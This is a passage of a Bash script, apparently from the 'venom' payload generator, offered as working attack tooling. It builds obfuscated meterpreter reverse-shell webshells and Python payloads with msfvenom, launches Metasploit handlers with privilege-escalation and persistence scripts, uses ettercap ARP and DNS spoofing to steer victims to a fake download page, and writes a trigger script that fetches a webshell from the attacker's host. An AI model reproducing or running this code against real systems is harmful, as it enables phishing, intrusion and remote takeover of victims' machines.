        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

fi




sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.c > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/backdoor.exe > /dev/null 2>&1
rm $IPATH/output/$N4m.exe > /dev/null 2>&1
rm $IPATH/output/$N4m.py > /dev/null 2>&1
rm $IPATH/output/template.c > /dev/null 2>&1
rm $ApAcHe/$N4m.pdf > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}






# ------------------------------------------------------
# build shellcode in PHP (webserver stager)
# php/meterpreter raw format OR php/base64 format
# Thanks to my friend 'egypt7' from rapid7 for this one
# interactive kali-apache2 php exploit (by me)
# ------------------------------------------------------
sh_shellcode16 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: egypt7" --entry --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="egypt7";fi

echo "[☠] Building shellcode -> php format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PHP - WEBSHELL
    PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/$N4m.php"

echo ""
echo "[☠] building raw shellcode..."
sleep 2
echo "[☠] Injecting shellcode -> $N4m.php!"
sleep 2
# delete bad chars in php payload
echo "[☠] deleting webshell.php junk..."
sleep 2
cd $IPATH/output



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
       fi


   else


     # edit files nedded
     cd $IPATH/templates/phishing
     cp $InJEc12 mega[bak].html
     sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
     mv copy.html $ApAcHe/index.html > /dev/null 2>&1
     # copy from output
     cd $IPATH/output
     echo "[☠] creating archive -> $N4m.zip"
     zip $N4m.zip $N4m.php > /dev/null 2>&1
     cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1


if [ "$D0M4IN" = "YES" ]; then
        echo "---"
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "---"
        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.php > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_webshell_menu
  clear
fi
}




sh_webshellbase () {
# ----------------------
# BASE64 ENCODED PAYLOAD
# ----------------------
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: egypt7b64" --entry --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="egypt7b64";fi

echo "[☠] Building shellcode -> php format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PHP -> WEBSHELL
    PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -e php/base64 > $IPATH/output/chars.raw"

st0r3=`cat $IPATH/output/chars.raw`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $st0r3
echo ""


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc11 $IPATH/templates/exec[bak].php
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc11 ]; then
      echo "[☠] exec.php -> found!"
      sleep 2
 
   else

      echo "[☠] exec.php -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# injecting shellcode into name.php
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.php!"
sleep 2
sed "s|InJ3C|$st0r3|g" exec.php > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m.php
chmod +x $IPATH/output/$N4m.php > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m.php\n\nCopy webshell to target website and visite\nthe URL to get a meterpreter session\nExample: http://$lhost/$N4m.php\n\nChose how to deliver: $N4m.php" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 300) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
       fi


   else

     # edit files nedded
     cd $IPATH/templates/phishing
     cp $InJEc12 mega[bak].html
     sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
     mv copy.html $ApAcHe/index.html > /dev/null 2>&1
     # copy from output
     cd $IPATH/output
     echo "[☠] creating archive -> $N4m.zip"
     zip $N4m.zip $N4m.php > /dev/null 2>&1
     cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1


if [ "$D0M4IN" = "YES" ]; then
        echo "---"
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "---"
        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.php > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
clear

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_webshell_menu
  clear
fi
}





# ------------------------------
# BASE64 MY UNIX APACHE2 EXPLOIT
# ------------------------------
sh_webshellunix () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
RRh0St=$(zenity --title="☠ TARGET IP ADRRESS ☠" --text "example: 192.168.1.69" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: UnixApacheExploit" --entry --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="UnixApacheExploit";fi
if [ -z "$RRh0St" ]; then echo "${RedF}[x]${white} This Module Requires Target ip addr input";sleep 3; sh_exit;fi

echo "[☠] Building shellcode -> php format ..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    RHOST   : $RRh0St
    FORMAT  : PHP -> APACHE2 (linux)
    PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -e php/base64 > $IPATH/output/chars.raw"

st0r3=`cat $IPATH/output/chars.raw`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $st0r3
echo ""


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc11 $IPATH/templates/exec[bak].php
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc11 ]; then
      echo "[☠] exec.php  -> found!"
      sleep 2
 
   else

      echo "[☠] exec.php -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


cd $IPATH/output/
# injecting settings into trigger.sh
echo "[☠] building  -> trigger.sh!"
sleep 2

echo "#!/bin/sh" > trigger.sh
echo "# bash template | Author: r00t-3xp10it" >> trigger.sh
echo "echo \"[*] Please wait, preparing software ..\"" >> trigger.sh
echo "wget -q -O /var/www/html/$N4m.php http://$lhost/$N4m.php && /etc/init.d/apache2 start && xdg-open http://$RRh0St/$N4m.php" >> trigger.sh
chmod +x $IPATH/output/trigger.sh > /dev/null 2>&1


cd $IPATH/templates/
# injecting shellcode into name.php
echo "[☠] Injecting shellcode -> $N4m.php!"
sleep 2
sed "s|InJ3C|$st0r3|g" exec.php > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m.php
chmod +x $IPATH/output/$N4m.php > /dev/null 2>&1


# edit files nedded
cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|trigger.sh|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
# copy from output
cd $IPATH/output
cp $N4m.php $ApAcHe/$N4m.php > /dev/null 2>&1
cp trigger.sh $ApAcHe/trigger.sh > /dev/null 2>&1
echo "[☠] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.php|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.php $ApAcHe/$N4m.php
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
          fi
        fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/trigger.sh > /dev/null 2>&1
rm $ApAcHe/$N4m.php > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_webshell_menu
  clear
fi
}







# -----------------------------------------------------------------
# build shellcode in PYTHON (multi OS)
# just because ive liked the python payload from veil i decided
# to make another one to all operative systems (python/meterpreter)
# P.S. python outputs in venom uses (windows/meterpreter) ;)
# -----------------------------------------------------------------
sh_shellcode17 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: Harmj0y" --width 300) > /dev/null 2>&1

## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="Harmj0y";fi

echo "[☠] Building shellcode -> python language..."
sleep 2
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PYTHON -> MULTI OS
    PAYLOAD : python/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/chars.raw"
st0r3=`cat $IPATH/output/chars.raw`
disp=`cat $IPATH/output/chars.raw | awk {'print $3'} | cut -d '(' -f3 | cut -d ')' -f1`

# display shellcode
# cat $IPATH/output/chars.raw
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc9 $IPATH/templates/exec0[bak].py
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2


   # check if exec.ps1 exists
   if [ -e $InJEc9 ]; then
      echo "[☠] exec0.py -> found!"
      sleep 2
 
   else

      echo "[☠] exec0.py -> not found!"
      exit
      fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi



# injecting shellcode into name.py
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.py!"
sleep 2
echo "[☠] Make it executable..."
sleep 2
sed "s|InJEc|$disp|g" exec0.py > obfuscated.raw
mv obfuscated.raw $IPATH/output/$N4m.py
chmod +x $IPATH/output/$N4m.py
cUe=`echo $N4m.py | cut -d '.' -f1`


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.py\n\nExecute: python $N4m.py\n\nchose how to deliver: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
